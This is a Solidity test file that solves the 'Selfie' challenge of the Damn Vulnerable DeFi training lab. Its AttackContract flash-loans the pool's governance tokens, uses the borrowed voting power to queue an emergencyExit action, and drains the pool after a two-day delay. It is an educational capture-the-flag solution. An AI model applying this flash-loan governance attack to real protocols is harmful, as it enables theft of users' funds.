// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        // ********************
        // 1. Upon first inspection, there is a governance contract that uses DVV Tokens as voting rights,
        // and we can flash loan DVV Tokens from the pool. So the immediate idea is to manipulate the voting
        // power with the flash-loaned token.
        // 2. The Governance Tokens first checks whether an intiator who queues transaction has more than half
        // the totalSupply of DVV.
        // 3. Plan: We take out a flash loan of DVV Tokens from pool, queue a transaction for emergency exit at the pool,
        // and execute it after 2 days.

        // ********************

        AttackContract attackContract = new AttackContract(token, governance, pool, recovery);
        attackContract.queueTransaction();

        skip(2 days);

        governance.executeAction(1);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

contract AttackContract is IERC3156FlashBorrower {
    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;
    address recovery;

    constructor(DamnValuableVotes _token, SimpleGovernance _governance, SelfiePool _pool, address _recovery) {
        token = _token;
        governance = _governance;
        pool = _pool;
        recovery = _recovery;
    }

    function queueTransaction() external {
        // 1. Layer 1: function signature and data to call emergencyExit()
        // 2. Layer 2: function signature and data to call queueAction() + Layer 1
        // 3. address of governance contract + Layer 2

        bytes memory emergencyExitData = abi.encodeWithSignature("emergencyExit(address)", recovery);
        bytes memory queueActionData =
            abi.encodeWithSignature("queueAction(address,uint128,bytes)", address(pool), uint128(0), emergencyExitData);
        bytes memory flashLoanExecutionData = abi.encode(address(governance), queueActionData);

        pool.flashLoan(
            IERC3156FlashBorrower(this), address(token), token.balanceOf(address(pool)), flashLoanExecutionData
        );
    }

    function onFlashLoan(
        address initiator,
        address flashLoanToken,
        uint256 flashLoanAmount,
        uint256,
        bytes calldata data
    ) external returns (bytes32) {
        require(initiator == address(this), "AttactContract: Wrong flash loan initiator");
        (address target, bytes memory functionCallData) = abi.decode(data, (address, bytes));
        // require(target == address(governance), "Here");
        console.log("Current AttackContract Balance: ", token.balanceOf(address(this)));
        console.log("Current Pool Balance: ", token.balanceOf(address(pool)));

        token.delegate(address(this)); // Delegate votes to update voting power

        (bool success,) = target.call{value: 0}(functionCallData);
        require(success, "AttackContract: Contract call failed");

        DamnValuableVotes(flashLoanToken).approve(address(pool), flashLoanAmount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
